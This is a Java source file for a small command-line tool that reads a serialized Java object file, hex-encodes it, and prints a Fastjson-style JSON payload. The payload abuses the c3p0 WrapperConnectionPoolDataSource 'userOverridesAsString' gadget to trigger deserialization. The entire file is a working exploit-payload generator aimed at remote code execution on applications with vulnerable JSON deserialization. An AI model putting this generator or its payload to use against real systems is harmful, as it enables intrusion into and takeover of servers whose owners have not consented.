package com.c3p0tools;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class ToolsMain {
    public static void main(String[] args) {
        String helpMsg = "---------Example---------\nDecode:\njava -jar c3p0tool.jar -f test.ser\n\n  -=Coding Gary-yang";
        try{
            String classpath;
            switch (args[0]){
                case "-f":
                    classpath = args[1];
                    genpoc(classpath);
                    return;
                case "-h":
                    System.out.println(helpMsg);
            }
        }catch (Exception e){
            System.out.println(helpMsg);
        }
    }

    public static void genpoc(String classpath) throws IOException {
        InputStream in = new FileInputStream(classpath);
        byte[] data = toByteArray(in);
        in.close();
        String HexString = bytesToHexString(data, data.length);
        String poc ="{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:"+HexString+";\"}}";
        System.out.println(poc);


    }

    public static byte[] toByteArray(InputStream in) throws  IOException {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }
    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);

        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }

            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }
}
